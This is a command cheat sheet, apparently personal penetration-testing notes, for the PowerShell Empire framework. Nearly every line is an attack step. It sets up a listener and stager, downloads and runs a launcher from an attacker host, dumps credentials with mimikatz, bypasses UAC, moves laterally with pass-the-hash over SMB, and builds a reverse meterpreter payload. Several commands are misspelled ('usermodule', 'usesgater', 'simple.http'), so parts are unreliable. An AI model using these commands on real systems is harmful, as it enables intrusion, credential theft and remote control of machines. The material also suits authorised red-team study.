# PowerShellEmpire

## Install

```text
git clone https://github.com/PowerShellEmpire/Empire.git
cd Empire
sudo ./setup/install.sh
sudo ./empire
```

## Listener

```text
uselistener http
set host <ip>
set port <ip>
execute
back
```

## Stager

```text
usestager launcher_bat
set listener http
execute
python3 -m simple.http
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://ip/launcher.bat','launcher.bat')
launcher.bat
```

## Agents

```text
agents
interact <id>
sysinfo
```

## Modules

### get\_user

```text
usemodule situational_awareness/network/powerview/get_user
execute
```

### PrivEsc

```text
usermodule powershell/privesc/powerup
execute
```

```text
usermodule powershell/privesc/bypass_uacfodhelper
set listener http
execute
```

### mimikatz

```text
usermodule credentials/mimikatz/logonpasswords
execute
creds
creds add <domain> <user> <pass>
```

### Lateral Movement

```text
usermodule powershell/lateral_movement/invoke_smbex
set ComputerName win10-x86
set listener http
set username <username>
set hash <hash>
set domain <domain>
execute
```

## From PE to MSF

```text
msfvenom -p windows/meterpreter/reverse_http lhost=<ip> lport=<port> -f exe -o ~/met.exe
msfconsole -q
use multihandler
set payload windows/meterpreter/reverse_http
set lhost <ip>
set lport <lport>
exploit
shell met.exe
```

## From MSF to PE

```text
usesgater windows/launcher.bat
upload launcher.bat
shell
launcher.bat
```

